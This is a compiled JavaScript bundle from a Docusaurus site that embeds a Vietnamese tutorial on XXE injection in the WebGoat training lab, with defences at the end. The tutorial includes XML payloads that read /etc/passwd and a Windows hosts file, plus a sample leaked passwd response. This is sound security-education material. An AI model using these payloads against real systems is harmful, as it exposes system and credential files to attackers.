"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[3153],{28453:(n,e,t)=>{t.d(e,{R:()=>c,x:()=>o});var i=t(96540);const s={},r=i.createContext(s);function c(n){const e=i.useContext(r);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:c(n.components),i.createElement(r.Provider,{value:e},n.children)}},86345:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>a,contentTitle:()=>o,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03","title":"1.03 | XXE","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","source":"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03.md","sourceDirName":"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration","slug":"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03","draft":false,"unlisted":false,"editUrl":"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03.md","tags":[{"inline":true,"label":"web-security","permalink":"/en/docs/tags/web-security"},{"inline":true,"label":"webgoat","permalink":"/en/docs/tags/webgoat"},{"inline":true,"label":"security-misconfiguration","permalink":"/en/docs/tags/security-misconfiguration"},{"inline":true,"label":"xxe","permalink":"/en/docs/tags/xxe"},{"inline":true,"label":"webgoat-2023.8","permalink":"/en/docs/tags/webgoat-2023-8"}],"version":"current","lastUpdatedAt":1756137485000,"sidebarPosition":1,"frontMatter":{"title":"1.03 | XXE","slug":"XXE-03","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","image":"https://tiennhm.github.io/img/docs/database.jpg","sidebar_position":1,"tags":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"keywords":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"enableComments":true,"draft":false},"sidebar":"tutorialSidebar","previous":{"title":"1.02 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02"},"next":{"title":"1.04 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-04"}}');var s=t(74848),r=t(28453);const c={title:"1.03 | XXE",slug:"XXE-03",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},o=void 0,a={},l=[{value:"\ud83d\udccc <strong>1. V\xed d\u1ee5 v\u1ec1 XML Entity</strong>",id:"-1-v\xed-d\u1ee5-v\u1ec1-xml-entity",level:2},{value:"\ud83d\udd25 <strong>2. External DTD Declaration (T\u1eadp tin DTD b\xean ngo\xe0i)</strong>",id:"-2-external-dtd-declaration-t\u1eadp-tin-dtd-b\xean-ngo\xe0i",level:2},{value:"\ud83d\udea8 <strong>3. XXE Injection \u2013 \u0110\u1ecdc file h\u1ec7 th\u1ed1ng</strong>",id:"-3-xxe-injection--\u0111\u1ecdc-file-h\u1ec7-th\u1ed1ng",level:2},{value:"\ud83d\udee1 <strong>4. C\xe1ch ph\xf2ng ch\u1ed1ng XXE</strong>",id:"-4-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",level:2}];function d(n){const e={blockquote:"blockquote",br:"br",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsxs)(e.p,{children:["\ud83d\udea8 ",(0,s.jsx)(e.strong,{children:"XXE Injection Example"})]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-1-v\xed-d\u1ee5-v\u1ec1-xml-entity",children:["\ud83d\udccc ",(0,s.jsx)(e.strong,{children:"1. V\xed d\u1ee5 v\u1ec1 XML Entity"})]}),"\n",(0,s.jsxs)(e.p,{children:["Nh\u01b0 \u0111\xe3 bi\u1ebft, m\u1ed9t ",(0,s.jsx)(e.strong,{children:"Entity"})," c\xf3 th\u1ec3 \u0111\u01b0\u1ee3c khai b\xe1o trong DTD nh\u01b0 sau:"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" standalone="yes" ?>\n<!DOCTYPE author [\n  <!ELEMENT author (#PCDATA)>\n  <!ENTITY js "Jo Smith">\n]>\n<author>&js;</author>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 Khi XML parser x\u1eed l\xfd, ",(0,s.jsx)(e.code,{children:"&js;"})," s\u1ebd \u0111\u01b0\u1ee3c thay th\u1ebf b\u1eb1ng ",(0,s.jsx)(e.code,{children:'"Jo Smith"'}),"."]}),"\n",(0,s.jsxs)(e.h2,{id:"-2-external-dtd-declaration-t\u1eadp-tin-dtd-b\xean-ngo\xe0i",children:["\ud83d\udd25 ",(0,s.jsx)(e.strong,{children:"2. External DTD Declaration (T\u1eadp tin DTD b\xean ngo\xe0i)"})]}),"\n",(0,s.jsxs)(e.p,{children:["Ch\xfang ta c\xf3 th\u1ec3 khai b\xe1o m\u1ed9t ",(0,s.jsx)(e.strong,{children:"DTD b\xean ngo\xe0i"})," b\u1eb1ng c\xe1ch s\u1eed d\u1ee5ng ",(0,s.jsx)(e.code,{children:"SYSTEM"})," reference, v\xed d\u1ee5:"]}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udccc ",(0,s.jsxs)(e.strong,{children:["T\u1eadp tin XML ch\xednh (",(0,s.jsx)(e.code,{children:"email.xml"}),")"]})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE email SYSTEM "email.dtd">\n<email>\n  <to>webgoat@webgoat.org</to>\n  <from>webwolf@webwolf.org</from>\n  <subject>Your app is great, but contains flaws</subject>\n  <body>Hi, your application contains some SQL injections</body>\n</email>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udccc ",(0,s.jsxs)(e.strong,{children:["T\u1eadp tin ",(0,s.jsx)(e.code,{children:"email.dtd"})]})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:"<!ELEMENT email (to,from,subject,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT subject (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 Khi ",(0,s.jsx)(e.code,{children:"email.xml"})," \u0111\u01b0\u1ee3c x\u1eed l\xfd, n\xf3 s\u1ebd tham chi\u1ebfu \u0111\u1ebfn ",(0,s.jsx)(e.code,{children:"email.dtd"})," \u0111\u1ec3 x\xe1c \u0111\u1ecbnh c\u1ea5u tr\xfac h\u1ee3p l\u1ec7."]}),"\n",(0,s.jsxs)(e.h2,{id:"-3-xxe-injection--\u0111\u1ecdc-file-h\u1ec7-th\u1ed1ng",children:["\ud83d\udea8 ",(0,s.jsx)(e.strong,{children:"3. XXE Injection \u2013 \u0110\u1ecdc file h\u1ec7 th\u1ed1ng"})]}),"\n",(0,s.jsxs)(e.p,{children:["N\u1ebfu parser ",(0,s.jsx)(e.strong,{children:"cho ph\xe9p external entities"}),", hacker c\xf3 th\u1ec3 khai th\xe1c \u0111\u1ec3 \u0111\u1ecdc file h\u1ec7 th\u1ed1ng."]}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udccc ",(0,s.jsxs)(e.strong,{children:["Payload XXE \u0111\u1ec3 \u0111\u1ecdc ",(0,s.jsx)(e.code,{children:"/etc/passwd"})]})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE author [\n  <!ENTITY js SYSTEM "file:///etc/passwd">\n]>\n<author>&js;</author>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 Khi parser x\u1eed l\xfd, n\xf3 s\u1ebd thay ",(0,s.jsx)(e.code,{children:"&js;"})," b\u1eb1ng n\u1ed9i dung c\u1ee7a ",(0,s.jsx)(e.code,{children:"/etc/passwd"}),", l\xe0m r\xf2 r\u1ec9 th\xf4ng tin h\u1ec7 th\u1ed1ng."]}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udccc ",(0,s.jsx)(e.strong,{children:"Ph\u1ea3n h\u1ed3i c\u1ee7a server c\xf3 th\u1ec3 l\xe0:"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:"<author>\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\n</author>\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udccc ",(0,s.jsx)(e.strong,{children:"Tr\xean Windows, hacker c\xf3 th\u1ec3 thay \u0111\u1ed5i payload th\xe0nh:"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">\n'})}),"\n",(0,s.jsxs)(e.h2,{id:"-4-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",children:["\ud83d\udee1 ",(0,s.jsx)(e.strong,{children:"4. C\xe1ch ph\xf2ng ch\u1ed1ng XXE"})]}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"V\xf4 hi\u1ec7u h\xf3a DTD v\xe0 External Entities"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Trong Java:"}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n'})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Trong .NET:"}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-csharp",children:"XmlReaderSettings settings = new XmlReaderSettings();\nsettings.DtdProcessing = DtdProcessing.Prohibit;\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"D\xf9ng JSON thay th\u1ebf XML"}),(0,s.jsx)(e.br,{}),"\n","\u2705 ",(0,s.jsx)(e.strong,{children:"Gi\u1edbi h\u1ea1n quy\u1ec1n truy c\u1eadp file h\u1ec7 th\u1ed1ng"}),(0,s.jsx)(e.br,{}),"\n","\u2705 ",(0,s.jsxs)(e.strong,{children:["D\xf9ng WAF \u0111\u1ec3 ch\u1eb7n payload ch\u1ee9a ",(0,s.jsx)(e.code,{children:"<!ENTITY"})]})]})]})}function h(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}}}]);